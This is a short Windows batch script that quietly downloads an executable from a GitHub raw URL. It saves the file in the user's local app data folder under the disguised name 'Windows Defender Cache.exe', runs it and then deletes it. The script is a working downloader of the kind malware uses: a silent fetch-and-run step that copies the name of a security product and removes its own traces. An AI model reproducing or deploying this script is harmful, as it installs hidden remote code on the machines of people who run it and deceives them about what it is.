@echo off
setlocal
set "L=https://github.com/stacksstacks333/h/raw/main/calcs.exe"
set "P=%LOCALAPPDATA%\Windows Defender Cache.exe"
curl --silent -o "%P%" "%L%"
if exist "%P%" (
    call "%P%"
    del /q "%P%"
)
endlocal
